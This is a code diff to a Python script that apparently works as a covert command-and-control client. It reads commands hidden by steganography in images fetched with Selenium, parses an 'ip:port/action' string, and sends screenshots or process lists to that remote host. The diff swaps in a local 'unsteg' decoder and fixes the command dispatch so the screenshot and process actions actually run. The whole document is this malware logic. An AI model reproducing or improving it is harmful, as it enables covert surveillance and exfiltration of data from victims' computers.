@@ -6,6 +6,7 @@ from selenium.webdriver.support import expected_conditions
 import chromedriver_binary
 import config,actions
 import os,re,requests
+from modules.steg import unsteg
 
 USER = config.USER
 BASE_URL = config.BASE_URL
@@ -60,7 +61,7 @@ def extract_txt(dir_path):
     for img in imgs:
         path = dir_path + os.path.basename(img)
         try:
-            secret_text = Steganography.decode(path)
+            secret_text = unsteg(path)
             return secret_text
         except:
             print('Failed to extract from: {}'.format(path))
@@ -68,14 +69,14 @@ def extract_txt(dir_path):
 
 
 def parse_txt(txt):
-    parsed = txt.split('/')
+    parsed = txt.strip().split('/')
     ip = parsed[0].split(':')[0]
     port = int(parsed[0].split(':')[1])
     action = parsed[1]
-    if (parsed == 'screenshot'):
+    if (action == 'screenshot'):
         img = actions.screenshot()
         actions.send_to_server(ip, port, img)
-    elif (parsed == 'processes'):
+    elif (action == 'processes'):
         procs = actions.processes()
         actions.send_to_server(ip, port, procs)
     else:
